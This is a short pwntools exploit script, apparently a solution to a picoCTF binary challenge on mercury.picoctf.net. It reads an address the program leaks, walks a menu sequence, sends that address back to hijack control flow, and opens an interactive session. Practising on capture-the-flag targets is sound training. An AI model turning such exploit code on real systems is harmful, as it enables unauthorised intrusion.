from pwn import *
host = "mercury.picoctf.net"
port = 61817
exe = "./vuln"
binary = context.binary = ELF(exe,checksec=False)
rop = ROP(binary)       
def conn():
    if args.LOCAL:
        return process(exe)
    else :
        return remote(host,port)
def main():
    p = conn()
    p.sendline(b"s")
    p.recvuntil(b"OOP! Memory leak...")
    add = p.recvline().strip().decode()
    print(add)
    p.sendline(b"i")
    p.sendline(b"Y")
    p.sendline(b"l")
    p.sendlineafter(b"try anyways:",p32(int(add,16)))
    p.interactive()

if __name__ == "__main__":
     main()